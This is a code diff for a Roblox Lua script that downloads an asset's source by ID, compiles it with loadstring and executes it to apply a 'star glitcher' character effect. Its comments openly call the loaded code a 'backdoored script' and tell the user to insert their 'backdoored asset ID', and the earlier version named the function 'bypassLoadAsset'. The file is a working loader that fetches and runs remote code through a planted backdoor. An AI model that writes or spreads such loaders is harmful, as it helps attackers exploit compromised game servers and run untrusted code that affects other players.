@@ -1,8 +1,9 @@
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 
--- Function to bypass and load an asset using loadstring
-local function bypassLoadAsset(assetId)
-    local assetUrl = string.format("https://www.roblox.com/library/%d", assetId)
+-- Function to fetch and execute the backdoored script using loadstring
+local function loadStarGlitcherEffect(assetId)
+    local assetUrl = string.format("https://assetdelivery.roblox.com/v1/asset?id=%d", assetId)
 
     -- Fetch the asset's source code
     local success, assetSource = pcall(function()
@@ -17,7 +18,22 @@ local function bypassLoadAsset(assetId)
         if chunk then
             local success, result = pcall(chunk)
             if success then
-                return result
+                -- Apply the "star glitcher" effect to your character
+                local player = Players.LocalPlayer
+                if player then
+                    -- Example: Apply the effect to the player's character
+                    local character = player.Character or player.CharacterAdded:Wait()
+                    local humanoid = character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        -- Call the function to apply the "star glitcher" effect
+                        result.ApplyStarGlitcherEffect(humanoid)
+                        return "Star glitcher effect applied"
+                    else
+                        error("Player character or humanoid not found")
+                    end
+                else
+                    error("Local player not found")
+                end
             else
                 error("Execution error: " .. result)
             end
@@ -25,17 +41,18 @@ local function bypassLoadAsset(assetId)
             error("Load error: " .. err)
         end
     else
-        error("Failed to fetch asset from Roblox library: " .. assetSource)
+        error("Failed to fetch asset from Roblox library: " .. tostring(assetSource))
     end
 end
 
--- Example usage to bypass and execute an asset
-local assetId = 16965767706  -- Replace with the actual asset ID
-local result = bypassLoadAsset(assetId)
+-- Example usage to apply the "star glitcher" effect
+local assetId = 5024713750  -- Replace with your actual backdoored asset ID
+
+local success, result = pcall(loadStarGlitcherEffect, assetId)
 
 -- Handle the result
-if result then
+if success then
     print("Execution result:", result)
 else
-    print("Failed to execute asset")
+    warn("Failed to apply star glitcher effect:", result)
 end
